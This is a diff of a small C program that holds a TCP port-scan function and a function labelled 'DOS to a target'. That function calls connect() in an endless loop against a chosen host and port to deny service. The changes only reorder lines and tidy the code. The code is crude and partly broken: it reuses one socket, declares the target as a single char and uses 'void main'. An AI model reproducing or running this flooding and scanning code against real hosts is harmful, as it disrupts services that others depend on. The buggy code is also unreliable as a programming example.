@@ -25,8 +25,8 @@ void PortScan(char *target)
     {
         mySocket = socket(AF_INET,SOCK_STREAM,0);
         targetSocket.sin_family = AF_INET;
-        targetSocket.sin_port = htons(port);
         targetSocket.sin_addr.s_addr = inet_addr(target);
+        targetSocket.sin_port = htons(port);
         connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
         
         if(connectMySocket)
@@ -47,28 +47,28 @@ void PortScan(char *target)
 // DOS to a target
 void DenialOfService(char *target,  int port)
 {
-    int mySocket;
-    int connectMySocket; 
     
-    struct sockaddr_in targetSocket;
-
-    /*Need put it in on string...*/
+    int mySocket;
     mySocket = socket(AF_INET,SOCK_STREAM,0);
+    int connectMySocket;
+    struct sockaddr_in targetSocket;
     targetSocket.sin_family = AF_INET;
-    targetSocket.sin_port = htons(port);
     targetSocket.sin_addr.s_addr = inet_addr(target);
-    /*................................*/ 
+    targetSocket.sin_port = htons(port);
+    
     
     while (port != 0)
+
     {
-        
+   
         connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
         printf("The service is soffering DoS");
 
     }
+
 }
 
-void main ()
+void main (void)
 {
    char target;
    int input;
